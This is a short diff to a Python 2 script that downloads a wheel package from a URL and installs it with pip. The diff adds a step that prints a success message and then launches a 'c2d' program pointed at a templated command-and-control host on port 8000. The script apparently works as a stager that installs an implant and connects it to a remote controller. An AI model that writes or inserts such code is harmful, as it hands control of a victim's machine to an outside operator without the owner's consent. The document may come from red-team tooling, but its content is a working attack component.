@@ -1,4 +1,4 @@
-import os, urllib, pip, re
+import os, urllib, pip, re, subprocess
 
 
 def install(package):
@@ -18,3 +18,7 @@ if __name__ == "__main__":
     filename = re.findall("filename=(.+)", urllib.urlopen(url).info().getheader("Content-Disposition"))[0]
     whl = urllib.urlretrieve(url, filename)
     install(filename)
+    print '[+] Install succesfull, configuring host'
+    subprocess.call(['c2d', '--c2-host', '{{hostname}}', '--c2-port', '8000'])
+
+
